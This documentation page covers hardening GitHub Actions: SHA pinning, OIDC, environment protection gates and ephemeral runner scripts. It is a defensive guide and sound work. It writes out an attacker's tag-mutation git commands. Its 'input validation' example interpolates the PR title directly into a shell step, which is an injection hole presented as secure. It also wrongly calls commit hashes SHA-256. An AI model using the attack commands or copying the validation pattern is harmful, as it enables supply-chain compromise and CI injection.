##      # (3) Pin actions to SHA
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

##      # (4) Avoid secrets where possible - use OIDC
      - uses: aws-actions/configure-aws-credentials@010d0da01d0b5a38af31e9c3470dbfdabdecca3a  # v4.0.1
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-actions
          aws-region: us-east-1

##      # (5) Validate inputs before use
      - name: Run tests
        run: |
          if [[ "${{ github.event.pull_request.title }}" =~ ^[a-zA-Z0-9\ \-]+$ ]]; then
            npm test
          else
            echo "Invalid PR title format"
            exit 1
          fi
```

##### Priority Order for Hardening

```mermaid
flowchart LR
    A["1. Pin Actions<br/>to SHA"] --> B["2. Minimal<br/>Permissions"]
    B --> C["3. OIDC<br/>Federation"]
    C --> D["4. Secure<br/>Triggers"]
    D --> E["5. Harden<br/>Runners"]

    %% Ghostty Hardcore Theme
    style A fill:#f92572,color:#1b1d1e
    style B fill:#fd971e,color:#1b1d1e
    style C fill:#e6db74,color:#1b1d1e
    style D fill:#a6e22e,color:#1b1d1e
    style E fill:#66d9ef,color:#1b1d1e

```

**Rationale**:

1. **Action pinning** prevents supply chain attacks with minimal workflow changes
2. **Minimal permissions** limits blast radius of any successful attack
3. **OIDC federation** eliminates long-lived secrets in most workflows
4. **Secure triggers** prevents fork-based attacks on public repositories
5. **Runner hardening** protects against persistent access and lateral movement

#### Why Not Just Read GitHub Docs?

GitHub's official documentation covers individual security features. It does not provide:

- **Decision frameworks**: Which pattern for which scenario
- **Copy-paste templates**: Production-ready configurations
- **Automation scripts**: Audit and enforcement tooling
- **Real-world context**: Why each pattern matters in practice
- **Integration patterns**: How to combine multiple security controls

Vendor cheat sheets (GitGuardian, StepSecurity, Salesforce, Wiz) each cover fragments. This hub consolidates all patterns with operational context.

#### Integration with Enforcement

Security patterns are only effective when enforced. See [Enforce](../../enforce/index.md) for:

- Branch protection requiring security checks
- Pre-commit hooks validating workflow syntax
- Policy-as-code enforcing action allowlists
- Status checks blocking insecure patterns

#### Related Content

- **[GitHub Apps](../github-apps/index.md)**: Secure authentication for cross-repository automation
- **[Enforce](../../enforce/index.md)**: Make security patterns mandatory through automation
- **[GitHub Actions Integration Patterns](../../patterns/github-actions/actions-integration/index.md)**: Implementation patterns for GitHub Apps with Actions workflows
- **[File Distribution Use Case](../../patterns/github-actions/use-cases/file-distribution/index.md)**: Cross-repository file distribution automation pattern

#### Contributing

Found a security pattern we missed? See gaps in coverage? [Contribute on GitHub](https://github.com/adaptive-enforcement-lab/adaptive-enforcement-lab-com).

#### Quick Reference

| Pattern | Risk Mitigated | Effort | Impact |
| ------- | -------------- | ------ | ------ |
| **SHA Pinning** | Supply chain attacks | Low | High |
| **Minimal Permissions** | Token over-privilege | Low | High |
| **OIDC Federation** | Secret exposure | Medium | High |
| **Secure Triggers** | Fork-based attacks | Low | Medium |
| **Ephemeral Runners** | Runner persistence | High | Medium |
| **Input Validation** | Injection attacks | Medium | High |
| **Environment Protection** | Unauthorized deployment | Low | Medium |
| **Action Allowlisting** | Malicious actions | Medium | High |

---

> **Start with High Impact, Low Effort**
>
>
> Implement SHA pinning and minimal permissions first. Both require minimal workflow changes and dramatically reduce risk.
>

### Action Pinning Overview

Lock down your GitHub Actions supply chain. Unpinned actions are the fastest route to a compromised CI/CD pipeline.

> **The Risk**
>
>
> Every action in your workflow executes with access to your repository secrets, cloud credentials, and deployment permissions. A single compromised action can exfiltrate everything.
>

#### Why Action Pinning Matters

GitHub Actions workflows pull third-party code directly into your CI/CD pipeline. Without pinning, you're trusting that:

1. The action maintainer won't turn malicious
2. Their account won't be compromised
3. Their repository won't be hijacked
4. Tag references won't be moved to malicious commits

**Reality**: All four scenarios have occurred in production environments.

#### The Attack Surface

```mermaid
flowchart TD
    A["Unpinned Action<br/>uses: actions/checkout@v4"] --> B["Tag Reference"]
    B --> C{"Maintainer Updates Tag"}

    C -->|Legitimate Update| D["New Features"]
    C -->|Compromised Account| E["Malicious Code"]
    C -->|Hijacked Repo| F["Backdoor Injection"]

    E --> G["Exfiltrate Secrets"]
    E --> H["Deploy Backdoor"]
    E --> I["Modify Code"]

    F --> G
    F --> H
    F --> I

    %% Ghostty Hardcore Theme
    style A fill:#f92572,color:#1b1d1e
    style B fill:#fd971e,color:#1b1d1e
    style C fill:#e6db74,color:#1b1d1e
    style D fill:#a6e22e,color:#1b1d1e
    style E fill:#f92572,color:#1b1d1e
    style F fill:#f92572,color:#1b1d1e
    style G fill:#66d9ef,color:#1b1d1e
    style H fill:#66d9ef,color:#1b1d1e
    style I fill:#66d9ef,color:#1b1d1e

```

#### Tag References vs SHA Pinning

##### Tag-Based References (Unsafe)

```yaml
- uses: actions/checkout@v4
- uses: actions/setup-node@v3
```

**The Problem**: Tags are mutable. Maintainers can update `v4` to point to any commit. You have no guarantee the code hasn't changed since you tested it.

**Attack Vector**: Compromised maintainer moves tag to malicious commit. Every workflow using that tag now executes attacker code.

##### SHA Pinning (Secure)

```yaml
### actions/checkout v4.1.1
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11

### actions/setup-node v3.8.1
- uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d
```

**The Defense**: SHA-256 commit hashes are immutable. The code at that hash cannot change. You're pinning to exact, verified code.

**Comment Strategy**: Include the semantic version in a comment so humans know what SHA represents.

#### Tag vs SHA Comparison

| Aspect | Tag Reference | SHA Pinning |
| ------ | ------------- | ----------- |
| **Mutability** | Tag can move to any commit | SHA is immutable |
| **Supply Chain Risk** | High - trust maintainer forever | Low - trust specific commit |
| **Update Visibility** | Silent updates | Explicit updates via PR |
| **Compromise Detection** | Difficult - looks like normal update | Clear - SHA change triggers review |
| **Dependabot Support** | Yes | Yes |
| **Human Readability** | Good (`v4`) | Poor (`b4ffde6...`) without comments |
| **Security Posture** | Vulnerable | Hardened |

#### Real-World Attack Scenarios

##### Scenario 1: Compromised Maintainer Account

**Timeline**:

- T+0: Attacker compromises maintainer's GitHub account via credential stuffing
- T+1h: Attacker updates `v3` tag to point to backdoored commit
- T+2h: Thousands of workflows worldwide execute malicious code
- T+6h: Secrets exfiltrated to attacker-controlled servers
- T+24h: Breach discovered, tag reverted, damage done

**Impact**: Multi-organization breach. Secrets, credentials, and source code compromised across hundreds of repositories.

**Prevention**: SHA pinning. Workflows continue using verified commit. Dependabot flags the tag update for review.

##### Scenario 2: Repository Takeover

**Timeline**:

- T+0: Popular action repository uses simple password, no 2FA
- T+1d: Attacker gains access, adds malicious code to next release
- T+2d: Users update to new version via tag reference
- T+3d: Backdoor establishes persistence in CI/CD pipelines
- T+7d: Attacker pivots to production deployments

**Impact**: Supply chain compromise affecting downstream users. Deployment credentials stolen, production systems compromised.

**Prevention**: SHA pinning with Dependabot review. Team reviews changelog and diff before approving SHA update.

##### Scenario 3: Typosquatting with Tag Manipulation

**Timeline**:

- T+0: Attacker creates `actions/check0ut` (zero instead of 'o')
- T+1h: Developer makes typo in workflow file
- T+2h: Malicious action executes with repository secrets
- T+3h: AWS credentials exfiltrated
- T+4h: Attacker deploys crypto miners to organization's cloud account

**Impact**: Developer typo leads to cloud account compromise. Thousands in cloud costs, potential data breach.

**Prevention**: SHA pinning forces explicit review. Full action path visible in security review. Allowlisting blocks unknown actions.

#### Supply Chain Risk Framework

##### Trust Tiers

###### Tier 1: GitHub-Maintained Actions

- Examples: `actions/checkout`, `actions/setup-node`, `actions/upload-artifact`
- Risk: Low (GitHub's security team)
- Recommendation: SHA pin, but lower review priority

###### Tier 2: Verified Publishers

- Examples: `aws-actions/*`, `azure/*`, `google-github-actions/*`
- Risk: Medium (corporate security teams)
- Recommendation: SHA pin, review on updates

###### Tier 3: Community Actions

- Examples: Individual maintainers, small teams
- Risk: High (unknown security posture)
- Recommendation: SHA pin, thorough source review, consider forking

###### Tier 4: Unknown/Unvetted

- Risk: Critical
- Recommendation: Block until reviewed, consider alternatives

#### Attack Vector Deep Dive

##### 1. Tag Mutation Attack

**Mechanism**: Attacker with write access moves tag to malicious commit.

```bash
### Attacker commands
git tag -d v3
git tag v3 <malicious-commit-sha>
git push --force --tags
```

**Result**: All workflows using `@v3` now execute malicious code. No PR, no review, no notification.

##### 2. Dependency Confusion

**Mechanism**: Action imports malicious package via package manager inside action code.

**Example**:

```yaml
### Action looks safe
- uses: trusted-org/deploy-action@v2
```

But inside `trusted-org/deploy-action`:

```javascript
// action.js imports compromised package
const utils = require('internal-deploy-utils');  // Typosquatted package
```

**Result**: Even SHA-pinned action can be compromised if it pulls unpinned dependencies.

**Defense**: Review action source code, check action's own dependencies, use Dependabot for action repos.

##### 3. Compromised GitHub Account

**Mechanism**: Attacker uses stolen credentials or session hijacking to access maintainer account.

**Attack Path**:

1. Phishing email targets maintainer
2. Credentials harvested
3. Attacker logs in (no 2FA required)
4. Malicious commit pushed
5. Tag updated
6. Backdoor deployed to thousands of workflows

**Result**: Widespread compromise across all users of the action.

**Defense**: SHA pinning breaks attack chain. Workflows don't auto-update to compromised version.

#### Pinning Strategy

##### Baseline Security Posture

```yaml
name: Secure CI
on: [push]

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
##      # SHA-pinned actions with version comments
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: actions/setup-node@5e21ff4d9bc1a8cf6de233a3057d20ec6b3fb69d  # v3.8.1

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test
```

##### Update Workflow with Dependabot

Dependabot monitors your workflow files and creates PRs for action updates:

```yaml
### .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "dependencies"
      - "github-actions"
```

**Process**:

1. Dependabot detects new action version
2. Creates PR updating SHA with version comment
3. Team reviews changelog and diff
4. Approve or reject update
5. Merge updates approved changes

#### Exceptions and Trade-offs

##### When SHA Pinning May Not Apply

**Internal Actions** (same organization):

```yaml
### Internal shared action
- uses: my-org/shared-workflows/.github/actions/deploy@main
```

**Consideration**: If you control the repository and trust your team, tag references acceptable. Still recommend SHA pinning for audit trail.

**Docker Container Actions**:

```yaml
### Action runs in container
- uses: docker://alpine:3.18
```

**Consideration**: Container images have their own pinning strategy (digest-based). Apply same principles:

```yaml
### Digest-pinned container
- uses: docker://alpine@sha256:abc123...
```

#### Integration with Security Controls

##### 1. Action Allowlisting

Organization-level policy restricts which actions can be used:

```text
Settings → Actions → General → Allow select actions and reusable workflows
```

Add verified actions to allowlist. Blocks unknown actions at workflow runtime.

##### 2. Branch Protection

Require status checks for workflows that modify action pins:

- Enforce code review for `.github/workflows/*` changes
- Require security team approval for new actions
- Block force pushes to protected branches

##### 3. Audit and Monitoring

Track action usage across organization:

- Audit log: Filter by `workflow_job`
- SIEM integration: Alert on new action patterns
- Periodic reviews: Quarterly action security audit

#### Next Steps

Ready to implement SHA pinning? Continue with:

- **[SHA Pinning Patterns](sha-pinning.md)**: Complete implementation patterns with copy-paste examples
- **[Automation Scripts](automation.md)**: Detect unpinned actions, bulk update to SHAs, verify pins
- **[Dependabot Configuration](dependabot.md)**: Automated updates with security review workflow

#### Quick Reference

| Risk | Mitigation | Effort |
| ---- | ---------- | ------ |
| **Tag mutation** | SHA pinning | Low |
| **Compromised maintainer** | SHA pinning + review | Medium |
| **Typosquatting** | Allowlisting | Medium |
| **Dependency confusion** | Source review | High |
| **Silent updates** | Dependabot + PR review | Low |

---

> **Start Today**
>
>
> Pin your most critical workflows first. Focus on workflows with:
>
> - Production deployment access
> - Cloud credential usage
> - Cross-repository permissions
>
> Use automation scripts to detect unpinned actions and generate SHA-pinned versions.
>

### Complete Workflow Examples

> **Ready-to-Deploy Templates**
>
>
> These examples integrate multiple security controls into production-ready workflows. Each template includes inline security comments, permission scoping, and cross-references to detailed pattern documentation.
>

Copy-paste ready workflows demonstrating all security patterns from this hub.

Each example integrates multiple security controls from across the hub: action pinning, minimal permissions, secret management, safe triggers, and more. All examples are complete and production-ready.

#### Available Examples

##### [Secure CI Workflow](ci-workflow/index.md)

Hardened continuous integration with comprehensive security controls.

**Key Patterns**:

- Fork PR security with two-stage workflows
- Language-specific testing (Node.js, Python, Go)
- Secret scanning prevention
- Minimal GITHUB_TOKEN permissions
- SHA-pinned actions with version comments

**Use Cases**: Test automation, PR validation, pre-merge quality gates

---

##### [Release Workflow](release-workflow/index.md)

Signed releases with SLSA provenance and artifact attestations.

**Key Patterns**:

- Keyless signing with OIDC
- SLSA L2/L3 provenance generation
- Artifact attestations for GitHub releases, containers, and NPM packages
- Environment protection for release branches
- Minimal permissions with `id-token: write` and `attestations: write`

**Use Cases**: GitHub releases, container publishing, NPM publishing, signed artifacts

---

##### [Deployment Workflow](deployment-workflow/index.md)

OIDC-based cloud deployment with environment protection and automated rollback.

**Key Patterns**:

- OIDC federation to GCP (no stored secrets)
- Environment protection with approval gates and wait timers
- Canary rollout with traffic migration (10% → 100%)
- Container scanning and signing
- Automated rollback on deployment failure

**Use Cases**: Cloud Run deployment, Kubernetes/Helm deployment, multi-environment pipelines, canary releases

---

##### [Security Scanning](security-scanning/index.md)

Comprehensive SAST, dependency scanning, container scanning, and SARIF upload.

**Key Patterns**:

- CodeQL SAST with security-extended queries
- Dependency review with severity-based failure
- Container scanning (Trivy, SBOM generation with Syft/Grype)
- Language-specific scanning (Bandit, gosec, ESLint)
- SARIF aggregation and upload to Security tab
- Scheduled vulnerability scanning with issue creation

**Use Cases**: Security validation, compliance scanning, vulnerability detection, scheduled audits

---

#### Common Security Controls

All examples use:

- **SHA-pinned actions** with version comments for supply chain security
- **Minimal GITHUB_TOKEN permissions** scoped to job requirements
- **Environment protection** where appropriate (deployments, releases)
- **OIDC federation** for cloud access (no stored secrets)
- **Input validation** and safe trigger patterns
- **Inline `# SECURITY:` comments** explaining security decisions

#### Using These Examples

Each example includes:

- Complete workflow YAML ready to copy
- Inline `# SECURITY:` comments explaining security decisions
- Language-specific variants where applicable
- Security checklist for validation
- Common mistakes and how to avoid them
- Cross-references to relevant security patterns

#### Integration Points

These examples reference patterns from:

- [Action Pinning](../action-pinning/index.md) - SHA pinning, Dependabot, automation
- [Token Permissions](../token-permissions/index.md) - Minimal scopes, job-level permissions
- [Secret Management](../secrets/secrets-management/index.md) - OIDC, rotation, scanning
- [Third-Party Actions](../third-party-actions/index.md) - Trust tiers, evaluation
- [Runner Security](../runners/index.md) - Hardening, ephemeral patterns
- [Workflow Patterns](../workflows/triggers/index.md) - Safe triggers, environments, reusable workflows

#### Quick Start

1. **Choose** the example that matches your use case
2. **Copy** the workflow YAML to `.github/workflows/`
3. **Customize** the language/framework-specific steps
4. **Review** the security checklist
5. **Test** with `act` or a draft PR
6. **Deploy** to production

For additional guidance, see the [Quick Reference Cheat Sheet](../cheat-sheet/index.md).

### Environment Protection Patterns

Environments add approval gates, wait timers, and deployment controls to GitHub Actions workflows. Production deployments should never execute without human review.

> **The Risk**
>
>
> Workflows without environment protection can deploy malicious code to production in seconds. A compromised PR or workflow modification can push backdoors, exfiltrate data, or take down services before security teams detect the breach.
>

#### Environment Security Model

GitHub Environments provide deployment protection through approval gates, wait timers, branch policies, and deployment tracking.

```mermaid
flowchart TD
    A["Workflow Executes"] --> B{"Environment<br/>Configured?"}

    B -->|No Environment| C["Immediate Execution"]
    B -->|Environment Set| D{"Protection Rules"}

    C --> C1["No Review"]
    C --> C2["No Wait Timer"]
    C --> C3["No Branch Policy"]
    C --> C4["Risk: HIGH"]

    D --> E{"Required<br/>Reviewers?"}
    E -->|Yes| F["Wait for Approval"]
    E -->|No| G{"Wait Timer?"}

    F --> H["Reviewer Approves"]
    H --> G

    G -->|Yes| I["Wait N Minutes"]
    G -->|No| J{"Branch<br/>Policy?"}

    I --> J

    J -->|Yes| K["Verify Branch"]
    J -->|No| L["Deploy"]

    K -->|Allowed| L
    K -->|Denied| M["Deployment Failed"]

    L --> N["Deployment Tracked"]
    C4 --> O["Immediate Risk"]

    %% Ghostty Hardcore Theme
    style A fill:#66d9ef,color:#1b1d1e
    style B fill:#e6db74,color:#1b1d1e
    style C fill:#f92572,color:#1b1d1e
    style D fill:#a6e22e,color:#1b1d1e
    style E fill:#e6db74,color:#1b1d1e
    style F fill:#fd971e,color:#1b1d1e
    style H fill:#a6e22e,color:#1b1d1e
    style L fill:#a6e22e,color:#1b1d1e
    style M fill:#f92572,color:#1b1d1e
    style C4 fill:#f92572,color:#1b1d1e

```

#### Environment Protection Rules

Environments support four protection mechanisms.

##### Required Reviewers

Require manual approval from designated reviewers before deployment.

**Configuration**: Settings → Environments → Environment name → Required reviewers

**Reviewers**: Up to 6 users or teams

**Use Case**: Production deployments, security-sensitive operations

**Example**:

```yaml
name: Production Deploy
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - name: Deploy to production
        run: ./scripts/deploy.sh production
```

**Protection Behavior**:

1. Workflow reaches environment job
2. Workflow pauses, pending approval
3. GitHub notifies required reviewers
4. At least one reviewer must approve
5. Workflow resumes after approval

##### Wait Timer

Delay deployment execution for a fixed period. Gives security teams time to detect malicious deployments.

**Configuration**: Settings → Environments → Environment name → Wait timer

**Duration**: 0-43200 minutes (up to 30 days)

**Use Case**: Detect malicious commits before production deployment, compliance requirements

**Example Production Pattern**:

```yaml
name: Production Deploy with Wait Timer
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - run: ./scripts/deploy.sh production
```

Configure wait timer in Settings → Environments → production → Wait timer: 15 minutes.

**Recommended Wait Times**:

| Environment | Wait Time | Rationale |
| ----------- | --------- | --------- |
| Development | 0 minutes | Fast feedback |
| Staging | 5 minutes | Brief security scan window |
| Production | 15-30 minutes | Security team review, monitoring alerts |
| Critical Infrastructure | 60 minutes | Extended review, compliance validation |

##### Deployment Branch Policy

Restrict deployments to specific branches or tags.

**Configuration**: Settings → Environments → Environment name → Deployment branches

**Policy Types**:

1. **Protected branches only**: Only branches with protection rules
2. **Selected branches and tags**: Explicit allow-list with wildcard support
3. **All branches**: No restrictions (dangerous for production)

**Example Branch Policy Configuration**:

**Pattern**: `main`, `release/*`, `hotfix/*`

**Use Case**: Production environment only deploys from main, release, or hotfix branches

**Workflow**:

```yaml
name: Multi-Environment Deploy
on:
  push:
    branches: [main, 'release/**', 'hotfix/**']

permissions:
  contents: read
  id-token: write

jobs:
  deploy-production:
    runs-on: ubuntu-latest
    environment: production
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}
      - run: ./scripts/deploy.sh production

  deploy-staging:
    runs-on: ubuntu-latest
    environment: staging
    if: startsWith(github.ref, 'refs/heads/release/')
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}
      - run: ./scripts/deploy.sh staging
```

**Recommended Policies**:

| Environment | Policy | Branches/Tags |
| ----------- | ------ | ------------- |
| Development | All branches | Any branch |
| Staging | Selected branches | `main`, `release/*`, `develop` |
| Production | Protected branches only | `main` (with protection rules) |
| Hotfix | Selected branches | `main`, `hotfix/*` |

##### Environment Secrets

Store deployment credentials scoped to specific environments.

**Configuration**: Settings → Environments → Environment name → Environment secrets

**Scope**: Only available to workflows using the environment

**Use Case**: Separate production and staging credentials, minimize secret exposure

**Example**:

```yaml
name: Multi-Environment Deploy
on:
  workflow_dispatch:
    inputs:
      environment:
        required: true
        type: choice
        options:
          - staging
          - production

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ github.event.inputs.environment }}
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - run: ./scripts/deploy.sh ${{ github.event.inputs.environment }}
```

Environment secrets `WIF_PROVIDER` and `WIF_SERVICE_ACCOUNT` are scoped to `staging` and `production` environments with different values.

#### Deployment Gates

Combine protection rules for defense-in-depth.

##### Pattern 1: Production Triple Gate

**Protection**: Required reviewers + Wait timer + Branch policy

**Configuration**:

- Required reviewers: 2 platform team members
- Wait timer: 15 minutes
- Deployment branches: Protected branches only (`main`)

**Workflow**:

```yaml
name: Production Triple Gate
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

jobs:
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
      - uses: aquasecurity/trivy-action@84384bd6e777ef152729993b8145ea352e9dd3ef  # 0.17.0
        with:
          scan-type: 'fs'
          format: 'sarif'
          output: 'trivy-results.sarif'
      - uses: github/codeql-action/upload-sarif@cdcdbb579706841c47f7063dda365e292e5cad7a  # v2.13.4
        with:
          sarif_file: 'trivy-results.sarif'

  deploy:
    runs-on: ubuntu-latest
    needs: security-scan
    environment:
      name: production
      url: https://app.example.com
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - uses: google-github-actions/auth@55bd3a7c6e2ae7cf1877fd1ccb9d54c0503c457c  # v2.1.2
        with:
          workload_identity_provider: ${{ secrets.WIF_PROVIDER }}
          service_account: ${{ secrets.WIF_SERVICE_ACCOUNT }}

      - name: Deploy to production
        run: ./scripts/deploy.sh production

      - name: Notify deployment
        if: always()
        run: |
          curl -X POST https://slack.com/api/chat.postMessage \
            -H "Authorization: Bearer ${{ secrets.SLACK_BOT_TOKEN }}" \
            -d "channel=deployments" \
            -d "text=Production deployment ${{ job.status }} for ${{ github.sha }}"
```

**Protection Flow**:

### Ephemeral Runner Patterns

Persistent runners are persistence vectors. Deploy disposable infrastructure instead.

> **The Goal**
>
>
> Every job executes in a fresh environment. Malicious workflows cannot plant backdoors because the execution environment is destroyed after completion. State isolation prevents cross-job contamination.
>

#### Why Ephemeral Runners?

Persistent runners retain state between jobs. One compromised workflow means every subsequent job inherits the malicious modifications.

**Ephemeral Benefits**:

- **State Isolation**: Fresh filesystem, network identity, credentials per job
- **Backdoor Prevention**: No cron jobs, no persistence mechanisms survive job completion
- **Credential Containment**: Leaked credentials expire when environment is destroyed
- **Attack Surface Reduction**: Minimal installed packages, no accumulated cruft
- **Automatic Cleanup**: No manual intervention required to restore clean state

**Persistent Runner Risks**:

- Malicious job installs reverse shell in crontab for future execution
- Credentials stolen from filesystem persist across job boundaries
- Network connections remain open for reconnaissance between jobs
- Filesystem poisoning affects subsequent builds
- Compliance violations accumulate without audit trail

#### Deployment Models

Choose based on security requirements, provisioning speed, and infrastructure constraints.

| Model | Isolation Level | Provisioning Time | Security Risk | Best For |
| ----- | --------------- | ----------------- | ------------- | -------- |
| **Container** | Process + Network | 5-30 seconds | **Low** | Production workloads with frequent job execution |
| **VM** | Full virtualization | 30-120 seconds | **Very Low** | High-security workloads requiring hardware isolation |
| **ARC (Kubernetes)** | Pod + Node isolation | 10-60 seconds | **Low-Medium** | Organizations with existing Kubernetes infrastructure |

#### Container-Based Ephemeral Runners

Fresh container per job. Fast provisioning, minimal attack surface, strong isolation with gVisor.

##### Podman Runner Pattern

Rootless containers with automatic cleanup.

```bash
#!/bin/bash
### /opt/runner-orchestrator/run-ephemeral-job.sh
### Ephemeral runner using Podman rootless containers

set -euo pipefail

RUNNER_VERSION="2.311.0"
RUNNER_IMAGE="ghcr.io/actions/runner:${RUNNER_VERSION}"
RUNNER_TOKEN="${1:?Runner registration token required}"
RUNNER_NAME="ephemeral-$(date +%s)-$(openssl rand -hex 4)"
RUNNER_LABELS="self-hosted,ephemeral,container"

echo "==> Starting ephemeral runner: ${RUNNER_NAME}"

### Pull latest runner image
podman pull "${RUNNER_IMAGE}"

### Run container with strict isolation
podman run \
  --rm \
  --name "${RUNNER_NAME}" \
  --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,nodev,size=2G \
  --tmpfs /opt/runner/_work:rw,noexec,nosuid,nodev,size=8G \
  --security-opt no-new-privileges=true \
  --security-opt label=type:runner_t \
  --cap-drop ALL \
  --network slirp4netns:allow_host_loopback=false \
  --env RUNNER_TOKEN="${RUNNER_TOKEN}" \
  --env RUNNER_NAME="${RUNNER_NAME}" \
  --env RUNNER_LABELS="${RUNNER_LABELS}" \
  --env RUNNER_EPHEMERAL=true \
  "${RUNNER_IMAGE}"

echo "==> Runner ${RUNNER_NAME} completed and destroyed"
```

**Security Features**:

- `--read-only`: Immutable root filesystem prevents persistent modifications
- `--tmpfs`: Temporary writable storage with `noexec` to block malicious binaries
- `--security-opt no-new-privileges`: Prevents privilege escalation
- `--cap-drop ALL`: Removes all Linux capabilities
- `--network slirp4netns`: User-mode networking without host network access
- `RUNNER_EPHEMERAL=true`: Runner deregisters after single job

##### Podman with gVisor Isolation

Enhanced container isolation using gVisor user-space kernel.

```bash
#!/bin/bash
### Ephemeral runner with gVisor container runtime

set -euo pipefail

### Requires gVisor runsc runtime configured
### See: https://gvisor.dev/docs/user_guide/install/

RUNNER_VERSION="2.311.0"
RUNNER_IMAGE="ghcr.io/actions/runner:${RUNNER_VERSION}"
RUNNER_TOKEN="${1:?Runner registration token required}"
RUNNER_NAME="gvisor-ephemeral-$(date +%s)-$(openssl rand -hex 4)"

echo "==> Starting gVisor-isolated runner: ${RUNNER_NAME}"

podman run \
  --rm \
  --runtime /usr/local/bin/runsc \
  --name "${RUNNER_NAME}" \
  --read-only \
  --tmpfs /tmp:rw,size=2G \
  --tmpfs /opt/runner/_work:rw,size=8G \
  --security-opt no-new-privileges=true \
  --cap-drop ALL \
  --network slirp4netns \
  --env RUNNER_TOKEN="${RUNNER_TOKEN}" \
  --env RUNNER_NAME="${RUNNER_NAME}" \
  --env RUNNER_EPHEMERAL=true \
  "${RUNNER_IMAGE}"
```

**gVisor Benefits**:

- System calls intercepted by user-space kernel (not host kernel)
- Container escape requires gVisor exploit + kernel exploit
- Stronger isolation than standard Linux namespaces
- Performance trade-off: 10-20% overhead vs native containers

##### Systemd Service for Ephemeral Containers

Automatic provisioning on boot with systemd unit.

```ini
### /etc/systemd/system/github-runner-ephemeral@.service
### Systemd template for ephemeral container runners

[Unit]
Description=GitHub Actions Ephemeral Runner (Container %i)
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=github-runner
Environment=RUNNER_VERSION=2.311.0
Environment=RUNNER_IMAGE=ghcr.io/actions/runner:${RUNNER_VERSION}
Environment=RUNNER_TOKEN_FILE=/etc/github-runner/token
ExecStartPre=/usr/bin/podman pull ${RUNNER_IMAGE}
ExecStart=/opt/runner-orchestrator/run-ephemeral-job.sh $(cat ${RUNNER_TOKEN_FILE})
Restart=always
RestartSec=10
TimeoutStopSec=30

### Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadOnlyPaths=/
ReadWritePaths=/opt/github-runner

[Install]
WantedBy=multi-user.target
```

```bash
### Enable multiple concurrent ephemeral runners
systemctl enable github-runner-ephemeral@{1..5}.service
systemctl start github-runner-ephemeral@{1..5}.service
```

#### VM-Based Ephemeral Runners

Full VM per job. Strongest isolation, slower provisioning, higher resource overhead.

##### Cloud VM Autoscaling Pattern

Provision fresh VM for each job using cloud autoscaling.

###### GCP Managed Instance Group

```bash
#!/bin/bash
### Create GCP instance template for ephemeral runners

set -euo pipefail

PROJECT_ID="my-gcp-project"
REGION="us-central1"
ZONE="${REGION}-a"
TEMPLATE_NAME="github-runner-ephemeral-$(date +%Y%m%d-%H%M%S)"
SERVICE_ACCOUNT="github-runner@${PROJECT_ID}.iam.gserviceaccount.com"

### Create instance template with startup script
gcloud compute instance-templates create "${TEMPLATE_NAME}" \
  --project="${PROJECT_ID}" \
  --machine-type=e2-medium \
  --image-family=ubuntu-2204-lts \
  --image-project=ubuntu-os-cloud \
  --boot-disk-size=20GB \
  --boot-disk-type=pd-standard \
  --service-account="${SERVICE_ACCOUNT}" \
  --scopes=cloud-platform \
  --metadata=enable-oslogin=TRUE \
  --metadata-from-file=startup-script=/opt/runner-orchestrator/vm-startup.sh \
  --tags=github-runner,ephemeral \
  --network-interface=network=default,no-address

### Create managed instance group with autoscaling
gcloud compute instance-groups managed create github-runners-ephemeral \
